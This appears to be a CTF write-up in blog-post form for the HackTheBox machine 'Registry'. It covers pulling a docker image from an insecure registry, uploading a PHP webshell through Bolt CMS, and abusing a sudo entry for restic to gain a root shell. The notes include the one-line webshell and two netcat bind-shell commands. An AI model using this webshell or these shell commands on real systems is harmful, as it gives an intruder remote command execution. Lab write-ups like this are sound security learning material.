---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/xgkrHQlfaKA/0.jpg
layout: post
media_subpath: /assets/posts/2020-04-04-registry-hackthebox
tags:
- bolt cms
- docker
- docker registry
- hackthebox
- linux
- restic
- sudo
title: Registry @ HackTheBox
---

Registry is a 40-point machine on HackTheBox that involves interacting with a docker registry to download a docker image and finding a password and ssh private key inside. For root we exploit a flaw in bolt cms to upload a webshell and then abuse a sudo entry that allows us to start restic backup as root.

{% youtube xgkrHQlfaKA %}

## Notes

/etc/docker/daemon.json:

```
{
  "insecure-registries" : ["docker.registry.htb:80"]
}
```

docker:

```
sudo systemctl restart docker
docker login docker.registry.htb:80
docker pull docker.registry.htb:80/bolt-image:latest
docker image ls
docker image inspect <image id>
```

bolt webshell:

```
<?php echo system($_REQUEST['xcmd']);?>
```

```
http://registry.htb/bolt/files/xct.php?xcmd=nc.traditional+-lp+2000+-e /bin/bash
```

restic docs:

[https://restic.readthedocs.io/en/latest/030\_preparing\_a\_new\_repo.html](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html)

restic exploit:

```
sudo /usr/bin/restic backup -r rest/ -r sftp:bolt@127.0.0.1:/var/tmp/rest -o sftp.command="nc.traditional -lp 2000 -e /bin/bash" /proc/version
```